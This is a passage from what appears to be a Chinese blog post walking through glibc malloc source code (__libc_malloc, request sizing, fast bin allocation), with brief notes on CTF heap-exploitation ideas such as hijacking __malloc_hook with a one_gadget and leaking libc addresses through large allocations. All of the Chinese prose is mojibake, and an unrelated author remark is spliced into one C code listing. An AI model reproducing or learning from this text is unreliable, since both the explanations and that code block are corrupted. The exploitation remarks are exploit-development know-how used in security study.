·åˆšåˆšå¥½çš„æ•°å€¼ï¼Œè¿™æ ·æ›´å®¹æ˜“å‘ç”Ÿæº¢å‡ºï¼Œå“ªæ€•æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œä¹Ÿèƒ½å¤ŸåŠ ä»¥åˆ©ç”¨ã€‚</p><p>é‚£ä¹ˆç®—å‡ºäº†å®ƒçš„<code>chunk_size</code>ä¹‹åå‘¢ï¼Œæˆ‘ä»¬å…ˆä¼šåˆ¤æ–­è¿™ä¸ª<code>chunk_size</code>æ˜¯å¦<code>&lt;=global_max_fast</code>ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦åœ¨<code>fast bin</code>èŒƒå›´å†…ã€‚å¦‚æœåœ¨åˆ™ä¼˜å…ˆå¯»æ‰¾èƒ½åŒ¹é…çš„<code>fast bin</code>ï¼Œå¦‚æœè¯¥<code>size</code>çš„<code>fast bin</code>ä¸ºç©ºåˆ™ä¼šå¯»æ‰¾<code>small bin</code>ï¼Œ<code>small bin</code>ä¼šå¯»æ‰¾ç‰¹å®š<code>size</code>çš„<code>chunk</code>è¿”å›ã€‚å¦‚æœ<code>small bin</code>ä¹Ÿä¸ºç©ºï¼Œæˆ–è€…æ‰¾ä¸åˆ°èƒ½æ»¡è¶³çš„é‚£å°±ä¼šå»<code>large bin</code>ä¸­å¯»æ‰¾ï¼ŒåŒæ ·æ˜¯æœ€å°èƒ½æ»¡è¶³ï¼Œæ‰¾åˆ°ä¹‹åè¿”å›æˆ–è€…åˆ‡å‰²ä¹‹åè¿”å›ã€‚è¿˜æ‰¾ä¸åˆ°å°±ä¼šå»<code>unsorted bin</code>ï¼Œ<code>unsorted bin</code>åˆ™ä¼šæ‰¾ç¬¬ä¸€ä¸ªèƒ½æ»¡è¶³çš„<code>chunk</code>å¹¶è¿”å›æˆ–è€…åˆ‡å‰²ä¹‹åè¿”å›ï¼Œ<code>unsorted bin</code> ä¸­æ¯éå†ä¸€ä¸ªä¸æ»¡è¶³è¦æ±‚çš„<code>unsorted bin</code>å°±ä¼šæŠŠè¯¥<code>unsorted bin</code>åŠ åˆ°åˆé€‚çš„small binæˆ–è€…<code>large bin</code>å½“ä¸­ã€‚å¦‚æœåˆ‡å‰²ä¹‹åå‰©ä½™çš„éƒ¨åˆ†&lt;<code>MINSIZE</code>ï¼Œé‚£ä¹ˆåˆ™ä¸ä¼šåˆ‡å‰²æ•´ä¸ªè¿”å›ã€‚</p><p>å¦‚æœè¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Œé‚£ä¹ˆå°±ä¼šåˆ‡å‰²<code>top_chunk</code>ã€‚å¦‚æœ<code>top_chunk</code>éƒ½ä¸èƒ½æ»¡è¶³è¯·æ±‚çš„å¤§å°ï¼Œåˆ™ä¼š<code>free</code> <code>top_chunk</code>å¹¶å†ä¸€æ¬¡å‘æ“ä½œç³»ç»Ÿç”³è¯·æ–°çš„<code>top_chunk</code>ï¼Œè¿™æ¬¡ç”³è¯·åŒæ ·è¿˜æ˜¯ç”³è¯·ä¸€ä¸ª<code>0x21000B</code>çš„<code>top_chunk</code>ï¼Œé€šå¸¸æƒ…å†µä¸‹æ—§çš„<code>top_chunk</code>å’Œæ–°ç”³è¯·çš„<code>top_chunk</code>ç‰©ç†ç›¸é‚»ï¼Œé‚£ä¹ˆå¦‚æœ<code>free</code> æ—§çš„<code>top_chunk</code>è¿›å…¥äº†ä¸€ä¸ªé<code>fast bin</code>çš„é“¾å½“ä¸­ï¼Œå°±ä¼šè¢«æ–°çš„<code>top_chunk</code>åˆå¹¶ã€‚</p><p>å¦‚æœä¸€æ¬¡ç”³è¯·çš„å†…å­˜è¶…è¿‡<code>0x200000B</code>ï¼Œé‚£ä¹ˆå°±ä¸ä¼šåœ¨heapæ®µä¸Šåˆ†é…å†…å­˜ï¼Œå°†ä¼šä½¿ç”¨<code>mmap</code>åœ¨<code>libc</code>çš„<code>data</code>æ®µåˆ†é…å†…å­˜ã€‚é€šå¸¸åˆ©ç”¨å°±æ˜¯æ¯æ¬¡åˆ†é…ç»™åˆ†é…åœ°å€ï¼Œåˆ†é…<code>size</code>æ²¡é™åˆ¶é‚£å°±<code>malloc</code>ä¸€ä¸ªå¾ˆå¤§çš„å†…å­˜å°±å¯ä»¥ç›´æ¥æ³„éœ²<code>libc</code>çš„åœ°å€ã€‚</p><p>åˆ†é…æ–¹å¼åˆ°æ­¤å°±è®²å®Œäº†ã€‚</p><h2 id="mallocæºç åˆ†æ"><a href="#mallocæºç åˆ†æ" class="headerlink" title="mallocæºç åˆ†æ"></a>mallocæºç åˆ†æ</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç›´æ¥è§£è¯»ä¸€ä¸‹<code>malloc</code>çš„æºç ã€‚</p><h3 id="libc-mallocæºç åˆ†æ"><a href="#libc-mallocæºç åˆ†æ" class="headerlink" title="__libc_mallocæºç åˆ†æ"></a>__libc_mallocæºç åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mallocå®é™…ä¸Šä¼šç›´æ¥è°ƒç”¨è¿™é‡Œçš„<code>__libc_malloc</code>å‡½æ•°ï¼Œç„¶å<code>__libc_malloc</code>ä¹Ÿåªä¸è¿‡æ˜¯ä¸€å±‚åŒ…è£…è€Œå·²ï¼Œå®é™…ä¸Šå¤§éƒ¨åˆ†çš„é€»è¾‘éƒ½æ˜¯è°ƒç”¨<code>_int_malloc</code>å‡½æ•°å®Œæˆçš„ï¼Œé‚£ä¹ˆå…ˆæ¥åˆ†æå¤–é¢ã€‚</p><p>ç¬¬ä¸€æ®µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>å®šä¹‰äº†ä¸€ä¸ª<code>hook</code>å‡½æ•°æŒ‡é’ˆï¼Œå¦‚æœ<code>hook!=NULL</code>åˆ™ç›´æ¥è°ƒç”¨<code>hook</code>æŒ‡å‘çš„å†…å®¹ã€‚<code>hook</code>æ˜¯ä¸ºäº†æ–¹ä¾¿å¼€å‘è€…è°ƒè¯•çš„ä¸€ä¸ªä¸œè¥¿ï¼Œæ¯”å¦‚æˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª<code>malloc</code>å‡½æ•°æƒ³æµ‹è¯•å®ƒçš„æ€§èƒ½å¦‚ä½•ï¼Œé‚£ä¹ˆæˆ‘åœ¨è¿™é‡Œç›´æ¥è®©<code>__malloc_hook=my_malloc</code>å°±å¯ä»¥ç›´æ¥è°ƒç”¨æˆ‘è‡ªå·±å†™çš„mallocå‡½æ•°äº†ã€‚ä½†æ˜¯åŒæ—¶å®ƒä¹Ÿæ˜¯æœ€å®¹æ˜“è¢«åŠ«æŒçš„ï¼Œåˆšå¼€å§‹æˆ‘ä»¬å¾ˆå¤šé¢˜ç›®éƒ½æ˜¯é å†™<code>__malloc_hook</code>ä¸ºä¸€ä¸ª<code>onegadget</code>ï¼Œç„¶åè°ƒç”¨<code>malloc</code>å»<code>getshell</code>çš„ã€‚åœ¨<code>2.34</code>ç‰ˆæœ¬ä¸­ï¼Œ<code>__malloc_hook</code>åŒå…¶å®ƒå¤§éƒ¨åˆ†çš„<code>hook</code>éƒ½è¢«åˆ é™¤äº†ã€‚</p><p>ç¬¬äºŒæ®µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>arena_get</code>è·å¾—ä¸€ä¸ªåˆ†é…åŒºï¼Œ<code>arena_get</code>æ˜¯ä¸ªå®å®šä¹‰ï¼Œå®šä¹‰åœ¨<code>arena.c</code>ä¸­ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      arena_lookup (ptr);                           \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);                         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p><code>arena_lookup</code>å®šä¹‰å¦‚ä¸‹ï¼Œä¹Ÿæ˜¯è·å–åˆ†é…å™¨æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lookup(ptr) do &#123; \</span></span><br><span class="line"><span class="meta">      void *vptr = NULL;                              \</span></span><br><span class="line"><span class="meta">      ptr = (mstate) tsd_getspecific (arena_key, vptr);             \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>ç„¶ååŠ é”ï¼Œæ²¡äº†ï¼Œè·å–åˆ†é…å™¨æŒ‡é’ˆè¿™ä¸€æ®µä¸æ˜¯æˆ‘ä»¬ä¸»è¦è¦åˆ†æçš„ï¼Œä¹Ÿå°±ä¸è¿‡å¤šå»è§£æäº†ã€‚</p><p>ç¬¬ä¸‰æ®µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure><p>å®ƒæœ¬èº«æ³¨é‡Šä¹Ÿå†™æ¸…æ¥šäº†ï¼Œåœ¨èƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„<code>arena</code>ä¹‹å‰å°è¯•å¯»æ‰¾å¦å¤–ä¸€ä¸ª<code>arena</code>ï¼Œæˆ‘è¿™è‹±æ–‡æ¯”è¾ƒé£˜è¿˜è¯·äº²è§è°…ã€‚å¦‚æœ<code>arena</code>æ‰¾åˆ°äº†ä½†æ˜¯<code>_int_malloc</code>å±…ç„¶è¿”å›0äº†ï¼Œé‚£ä¹ˆå°±é‡æ–°å¯»æ‰¾å¦ä¸€ä¸ªåˆ†é…å™¨å†æ¬¡è°ƒç”¨ä¸€æ¬¡<code>_int_malloc</code>ã€‚å®Œäº†ä¹‹åå‘¢ï¼Œè¦ç»™<code>arena</code>è§£é”ï¼Œç„¶åè¿”å›å¾—åˆ°çš„<code>chunk</code>æŒ‡é’ˆã€‚</p><h3 id="int-mallocæºç åˆ†æ"><a href="#int-mallocæºç åˆ†æ" class="headerlink" title="_int_mallocæºç åˆ†æ"></a>_int_mallocæºç åˆ†æ</h3><p>ç”±äºæ¯”è¾ƒé•¿ï¼Œä¸ºäº†æ‘†è„±æ°´é•¿åº¦çš„å«Œç–‘å°±ä¸ç»™çœ‹æ€»ä»£ç äº†ï¼Œéœ€è¦çš„è‡ªå·±æ‰¾<code>glibc</code>çš„æºç å°±å¥½äº†ï¼Œä¸‹é¢æˆ‘ä¸€æ®µä¸€æ®µåˆ†æã€‚</p><h3 id="ç¬¬ä¸€æ®µï¼šmain-arenaåˆå§‹åŒ–"><a href="#ç¬¬ä¸€æ®µï¼šmain-arenaåˆå§‹åŒ–" class="headerlink" title="ç¬¬ä¸€æ®µï¼šmain_arenaåˆå§‹åŒ–"></a>ç¬¬ä¸€æ®µï¼šmain_arenaåˆå§‹åŒ–</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;  </span><br><span class="line">checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);<span class="built_in">free</span>çš„æºç åˆ†æå…ˆå’•ä¸€ä¼šï¼Œä¸»è¦æ˜¯å§ï¼Œç†¬å¤œå†™è¿™ç©æ„å—ä¸äº†ã€‚ã€‚</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å˜é‡å®šä¹‰å°±ä¸ç”¨çœ‹äº†ï¼Œæºç ä¸­ä¹Ÿéƒ½æ ‡æ³¨å‡ºæ¥äº†ï¼Œè¿™é‡Œæœ€ä¸»è¦å°±æ˜¯æŠŠç”¨æˆ·è¯·æ±‚çš„<code>bytes</code>è½¬æ¢æˆæœ€å°èƒ½æ»¡è¶³çš„<code>chunk size</code>ï¼Œç„¶åå®ƒçš„å˜é‡ååº”è¯¥æ˜¯<code>nb</code>ï¼Œè¿™ä¸ª<code>nb</code>åº”è¯¥æ˜¯<code>nbytes</code>çš„ç¼©å†™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="meta-keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;                          \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);                              \</span></span><br><span class="line"><span class="meta">      return 0;                                      \</span></span><br><span class="line"><span class="meta">    &#125;                                          \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŸæ¥ä¹Ÿç»™æ³¨é‡Šäº†ï¼Œè¿™ä¿©å®å®šä¹‰å°±æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡åšä¸€ä¸ªå‚æ•°checkã€‚</p><p>è¿™é‡Œè¿˜è¦æ³¨æ„ä¸€ä¸‹é‚£äº›å®å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely(<span class="built_in">exp</span>)è¡¨ç¤º<span class="built_in">exp</span>å¾ˆå¯èƒ½ä¸ºå‡ã€‚</span><br><span class="line">__glibc_likely(<span class="built_in">exp</span>)è¡¨ç¤º<span class="built_in">exp</span>å¾ˆå¯èƒ½ä¸ºçœŸã€‚</span><br><span class="line">__builtin_expect(<span class="built_in">exp</span>,value)è¡¨ç¤º<span class="built_in">exp</span>==valueå¤§æ¦‚ç‡æˆç«‹</span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ä¸ªå®å®šä¹‰åœ¨æºç ä¸­ç»å¸¸èƒ½çœ‹åˆ°ï¼Œå…¶å®å®ƒä¸ä¼šæ”¹ç¼–ç¨‹åºé€»è¾‘ï¼Œåªæ˜¯å‘Šè¯‰ç¼–è¯‘å™¨è¿™ä¸ªå¾ˆå¯èƒ½ä¸ºæŸä¸ªå€¼ï¼Œå°±æŠŠå¦çš„æƒ…å†µä½œä¸ºè·³è½¬ï¼ŒçœŸçš„æƒ…å†µå°±é¡ºåºè¿è¡Œä¸‹å»ï¼Œå‡å°‘ç¨‹åºçš„è·³è½¬ï¼Œä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥ä¼˜åŒ–ç¨‹åºè¿è¡Œé€Ÿåº¦ã€‚æˆ–è€…è¿˜æœ‰ä¸€ä¸ªç®€å•ç²—æš´çš„åŠæ³•ï¼Œä½ æŠŠè¿™ä¸‰ä¸ªå­—ç¬¦å…¨éƒ½å»äº†ï¼Œä¸å½±å“ä»£ç é€»è¾‘ã€‚</p><p>é‚£ä¹ˆè¿™ä¸€æ®µçš„é€»è¾‘å°±æ˜¯ï¼Œå¦‚æœåœ¨åˆ†é…çš„æ—¶å€™<code>arena</code>ä¸ºç©ºï¼Œé‚£å°±è°ƒç”¨<code>sys_malloc</code>ç³»ç»Ÿè°ƒç”¨å»è¯·æ±‚ä¸€ä¸ª<code>chunk</code>ï¼Œç„¶å<code>memset</code>è¿™ä¸ª<code>chunk</code>çš„æ•°æ®æ®µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ------------------ Testing support ----------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">alloc_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹<code>perturb_byte</code>ä¸ºå‡ï¼Œå·®ä¸å¤šæ„æ€å°±æ˜¯å¦‚æœä½ æ²¡æœ‰ç‰¹æ®Šè®¾ç½®ï¼Œé‚£ä¹ˆ<code>data</code>æ®µå…¨ä¸º0å­—èŠ‚ï¼Œå®é™…æƒ…å†µä¹Ÿç¡®å®æ˜¯è¿™æ ·çš„ã€‚</p><h3 id="ç¬¬äºŒæ®µï¼šfast-binçš„å¤„ç†"><a href="#ç¬¬äºŒæ®µï¼šfast-binçš„å¤„ç†" class="headerlink" title="ç¬¬äºŒæ®µï¼šfast binçš„å¤„ç†"></a>ç¬¬äºŒæ®µï¼šfast binçš„å¤„ç†</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//åœ¨mallocçš„æ—¶å€™æ£€æŸ¥äº†fastbinçš„sizeå‘ç°ä¸å¯¹</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå˜›å°±ä¼šåˆ¤æ–­ï¼Œä½ ç”³è¯·çš„è¿™ä¸ª<code>nb</code>æ˜¯å¦<code>&lt;=global_max_fast</code>ï¼Œå¦‚æœæˆç«‹é‚£ä¹ˆå°±ä¼šå…ˆåœ¨<code>fast bin</code>ä¸­å¯»æ‰¾èƒ½æ»¡è¶³çš„<code>chunk</code>ï¼Œå¹¶ä¸”ä¸€å®šæ˜¯å®Œå…¨åŒ¹é…ã€‚å®ƒå…ˆæ‰¾åˆ°<code>av-&gt;fastbinY[idx]</code>è§‚å¯Ÿæ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸ä¸º0åˆ™è¯´æ˜è¯¥<code>size</code>çš„<code>fast bin</code>æœ‰<code>chunk</code>ï¼Œé‚£ä¹ˆå°±åšä»¥ä¸‹åŠ¨ä½œï¼š</p><p>å–å‡º<code>av-&gt;fastbinY[idx]</code>ç»™<code>victim</code></p><p>é“¾è¡¨ä¸­åˆ 